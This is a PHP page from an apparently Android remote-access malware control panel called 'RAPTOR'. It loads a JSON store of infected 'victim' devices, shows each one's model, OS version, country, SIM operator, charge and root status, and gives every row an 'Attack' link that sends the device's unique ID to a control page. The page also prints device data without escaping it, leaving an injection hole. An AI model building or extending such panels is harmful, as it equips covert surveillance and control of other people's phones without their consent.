<?php 
require_once '../private/session_manager.php';

if(!isLogin()){
   header('Location: login.php');
}

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>RAPTOR</title>
    <link href="./css/theme.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="./css/toastify.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <script type="text/javascript" src="./js/toastify.js"></script>

    <style>
        body {
            background: linear-gradient(135deg, #121212 0%, #1a1a1a 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            font-family: 'Roboto', sans-serif;
        }
        
        .navbar {
            background-color: rgba(30, 30, 30, 0.95) !important;
            border: none;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
        }
        
        .navbar-brand {
            color: #00ff9d !important;
            font-weight: 500;
            font-size: 24px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .well {
            background-color: rgba(30, 30, 30, 0.95);
            border: 1px solid #2a2a2a;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(10px);
            padding: 40px !important;
        }
        
        legend {
            color: #00ff9d;
            font-size: 28px;
            font-weight: 500;
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 2px solid #00ff9d;
            padding-bottom: 10px;
        }
        
        .table {
            background-color: rgba(40, 40, 40, 0.5);
            border-radius: 8px;
            overflow: hidden;
        }
        
        .table thead th {
            background-color: rgba(0, 255, 157, 0.1);
            color: #00ff9d;
            font-weight: 500;
            border-bottom: 2px solid #00ff9d;
            padding: 15px;
        }
        
        .table tbody td {
            color: #ffffff;
            padding: 12px 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .table tbody tr:hover {
            background-color: rgba(0, 255, 157, 0.05);
        }
        
        .table a {
            color: #00ff9d;
            text-decoration: none;
            padding: 6px 12px;
            border-radius: 4px;
            background-color: rgba(0, 255, 157, 0.1);
            transition: all 0.3s ease;
        }
        
        .table a:hover {
            background-color: rgba(0, 255, 157, 0.2);
            color: #00ffcc;
        }
        
        .tall-row p {
            color: #666;
        }
        
        .tall-row a {
            color: #00ff9d;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        
        .tall-row a:hover {
            color: #00ffcc;
        }
        
        @keyframes glow {
            0% { box-shadow: 0 0 5px rgba(0, 255, 157, 0.2); }
            50% { box-shadow: 0 0 20px rgba(0, 255, 157, 0.4); }
            100% { box-shadow: 0 0 5px rgba(0, 255, 157, 0.2); }
        }
        
        .well {
            animation: glow 3s infinite;
        }
    </style>
</head>

<body>

<nav class="navbar navbar-default navbar-static-top">
    <div class="container-fluid">
        <div class="row">
            <div class="col-lg-4 col-lg-offset-4 text-center">
                <a class="navbar-brand" href="index.php">RAPTOR</a>
            </div>
        </div>
    </div>
</nav>

<div class="container">
    <div class="row" style="margin-top: 40px;">
        <div class="col-md-10 col-lg-offset-1">
            <div class="well">
                <legend>Device List</legend>

                <div class="row">
                    <div class="col-lg-12">
                        <table class="table table-striped table-hover">
                            <thead>
                            <tr>
                                <th>#</th>
                                <th>DEVICE</th>
                                <th>VERSION</th>
                                <th>COUNTRY</th>
                                <th>SIM OPERATOR</th>
                                <th>CHARGE</th>
                                <th>IS ROOTED</th>
                                <th>ACTION</th>
                            </tr>
                            </thead>
                            <tbody>
                            <?php
                            $strJsonFileContents = file_get_contents("../private/storage/device_list.json");
                            $victim_array = json_decode($strJsonFileContents, true);
                            $index_victim = 1;

                            foreach ($victim_array["device_list"] as $field => $value) {
                                echo '<tr>';
                                echo '<td>'.$index_victim.'</td>';
                                echo '<td>'.strtoupper($value['DEVICE_MODEL']).'</td>';
                                echo '<td>'.$value['SOFTWARE_VERSION'].'</td>';
                                echo '<td>'.$value['COUNTRY'].'</td>';
                                echo '<td>'.$value['SIM_OPERATOR'].'</td>';
                                echo '<td>'.$value['CHARGE'].'</td>';
                                echo '<td>'.$value['IS_ROOTED'].'</td>';
                                echo '<td><a href="kontrol-panel.php?target='.$value['UNIQUE_ID'].'&type=1'.'">Attack</a></td>';
                                echo '</tr>';
                                $index_victim += 1;
                            }
                            ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row tall-row">
        <div class="col-md-12 text-center">
            <p>Created by <a href="#">Mehmet Şirin Sulan</a>. &copy; 2021</p>
        </div>
    </div>
</div>

</body>
</html>
